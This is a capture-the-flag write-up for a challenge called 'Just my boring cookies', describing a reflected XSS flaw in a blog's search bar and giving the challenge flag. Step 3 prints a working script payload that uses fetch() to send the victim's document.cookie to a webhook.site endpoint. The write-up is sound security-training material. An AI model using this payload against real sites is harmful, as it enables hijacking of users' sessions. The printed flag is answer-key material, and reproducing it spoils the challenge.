# Challenge `Just my boring cookies`

* **Flag:** `SSof{USERS_HAVE_NO_SECRETS}`
* **Vulnerability:** Reflected Cross-Site Scripting (XSS)
* **Where:** Search bar input field of the blog application
* **Impact:** Allows execution of arbitrary JavaScript in the victim’s browser, enabling theft of session cookies
* **Notes:** I used Webhook.site to capture the stolen cookies.

---

## Steps to reproduce

1. Access the vulnerable blog application through the provided challenge URL.

2. Identify that the search bar reflects user input directly into the HTML response without proper sanitization or escaping, making it vulnerable to reflected XSS.

3. Insert the following **malicious JavaScript payload** into the search bar:

```html
<script>fetch('https://webhook.site/0237655b-876d-49dc-b95f-9e890f48aa14?cookie=' + document.cookie)</script>
```

4. Submit the search request. The injected JavaScript is immediately executed by the browser.

5. The script sends the victim’s cookies as part of a GET request to the attacker-controlled Webhook endpoint.

6. Open the Webhook and observe the incoming request containing the stolen cookie.

7. The leaked cookie contains the flag:

```
SSof{USERS_HAVE_NO_SECRETS}
```
